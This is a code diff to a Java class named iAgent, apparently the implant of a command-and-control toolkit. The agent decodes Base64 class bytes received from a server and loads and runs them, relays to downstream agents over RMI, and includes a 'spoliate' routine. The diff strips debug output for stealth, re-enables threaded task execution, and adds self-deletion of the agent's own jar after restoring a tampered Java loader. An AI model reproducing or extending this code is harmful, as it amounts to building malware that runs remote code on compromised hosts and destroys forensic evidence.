@@ -10,6 +10,7 @@ import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.OutputStreamWriter;
 import java.io.StringReader;
+import java.lang.invoke.MethodHandles;
 import java.lang.management.ManagementFactory;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
@@ -110,7 +111,7 @@ public class iAgent
     //move .\src\main\java\com\nocebo\nCore\genLib.class ..\server\fileroot\genLib.class
     //move .\src\main\java\com\nocebo\nCore\autoLib.class ..\server\fileroot\autoLib.class
     //cd src\main\java
-    //"C:\Program Files\Java\jdk1.8.0_202\bin\jar.exe" cf ..\..\..\..\server\fileroot\lib\iAgent.jar .\com\nocebo\nCore\*.class
+    //"C:\Program Files\Java\jdk1.8.0_202\bin\jar.exe" cfm ..\..\..\..\server\fileroot\lib\iAgent.jar ..\..\..\MANIFEST.TXT .\com\nocebo\nCore\*.class
     //ephemerals
     static public int shutdown = 0;
     static public String cookieData = "null";
@@ -128,9 +129,8 @@ public class iAgent
     static private security secInst = new security();
     static private pkgLib packager = new pkgLib();
 
-    public static void init() throws ParserConfigurationException, RemoteException, ClassNotFoundException, Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
+    public static void main(String[] args) throws ParserConfigurationException, RemoteException, ClassNotFoundException, Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
     {
-        System.out.println("valhalla");
         //add execution delay of 10 minutes +/- to 1st stage
         sessUUID = UUID.randomUUID().toString();
         nonce = sessUUID.substring(0,12).replace("-","");
@@ -210,19 +210,16 @@ public class iAgent
             }
             catch (Exception e)
             {
-                System.out.println(String.format("keepalive error: %s",e.getMessage()));
                 TimeUnit.MILLISECONDS.sleep((nUtil.rngenerator(4,10))*1000);
                 continue;
             }
         }
 
         if (c<4) {
-            System.out.println("react");
             react();
         }
         else
         {
-            System.out.println("spoliating");
             cm.spoliate();
         }
     }
@@ -353,6 +350,7 @@ public class iAgent
             String className = taskObj.get("class").toString();
             String classical = taskObj.get("mod").toString();
 
+            
             String[] args = new String(
                 Base64.getDecoder().decode(
                     taskObj.get("args").toString()
@@ -379,7 +377,6 @@ public class iAgent
                     byte[] rawMeth = Base64.getDecoder().decode(classicalElements[1]);
                     if (classNameActual.equals(className))
                     {
-                        System.out.println(classNameActual);
                         classObj = packager.load(classNameActual, rawMeth);
                     }
                     else
@@ -405,17 +402,13 @@ public class iAgent
             }
             else
             {
-                System.out.println("threading");
-                /*threader(
+                threader(
                     classObj,
                     (Method) methObj.get("methodical"),
                     args
                 );
-                */
-                Method rMethod = (Method) methObj.get("methodical");
-                System.out.println(rMethod.getName());
-                Object cObj = classObj.newInstance();
-                rMethod.invoke(cObj, args);
+                
+
                 
             }
             tasks.remove(t);
@@ -442,7 +435,6 @@ public class iAgent
 
     public static void send() throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
     {
-        System.out.println(output.toString());
         if (output.size() > 0)
         {
             for (int d=0;d<output.size();d++)
@@ -463,7 +455,6 @@ public class iAgent
                 }
                 catch (Exception e)
                 {
-                    System.out.println(e.getMessage());
                     continue;
                 }
             }
@@ -552,14 +543,12 @@ public class iAgent
             Hashtable methObj = new Hashtable();
             try
             {
-                System.out.println(cData.getName());
                 Method cMethodical = cData.getMethod(methodName,String[].class);
                 methObj.put("methodical",cMethodical);
                 methObj.put("error","null");
             }
             catch (Exception e)
             {
-                System.out.println("oops");
                 methObj.put("methodical","null");
                 methObj.put("error",e.getMessage());
             }
@@ -756,7 +745,6 @@ public class iAgent
                         tasks.remove(t);
                     }
                 }
-                System.out.println(taskData);
                 String rmiCookie = mkCookie(uuid,config.passMat);
                 downstreamAgents.put(uuid,rmiCookie);
                 
@@ -782,8 +770,6 @@ public class iAgent
             security secInst = new security();
 
 
-            System.out.println("putting");
-            System.out.println(downstreamAgents.containsKey(uuid));
             if (downstreamAgents.containsKey(uuid) && downstreamAgents.get(uuid).toString().equals(cookie))
             {
                 output.add(data);
@@ -1004,7 +990,6 @@ public class iAgent
 
                 connOutWriter.flush();
 
-                System.out.println(connMan.getResponseCode());
 
                 if (connMan.getResponseCode() == HttpsURLConnection.HTTP_OK)
                 {
@@ -1058,9 +1043,9 @@ public class iAgent
     {
         public void spoliate()
         {
-            
+            Class currentClass = MethodHandles.lookup().lookupClass();
             String loaderPath = new String();
-            byte[] loaderBytes = new Byte[]{};
+            byte[] loaderBytes = new byte[]{};
             try
             {
                 String[] envVarPath = System.getenv("_JAVA_OPTIONS").split(" ");
@@ -1070,17 +1055,18 @@ public class iAgent
                     {
                         String[] splitPath = envVarPath[p].split(":");
                         loaderPath = splitPath[1];
-                        String bakPath = String.format(".bak-%s",loadePath);
+                        String bakPath = String.format(".bak-%s",loaderPath);
                         Files.copy(Paths.get(bakPath), Paths.get(loaderPath), StandardCopyOption.REPLACE_EXISTING);
                         break;
                     }
                 }
+                Files.delete(Paths.get(currentClass.getProtectionDomain().getCodeSource().getLocation().toURI().getPath()));
             }
             catch (Exception e)
             {
                 
             }
-            Thread.currentThread().interrupt();
+            System.exit(0);
             
         }
     }
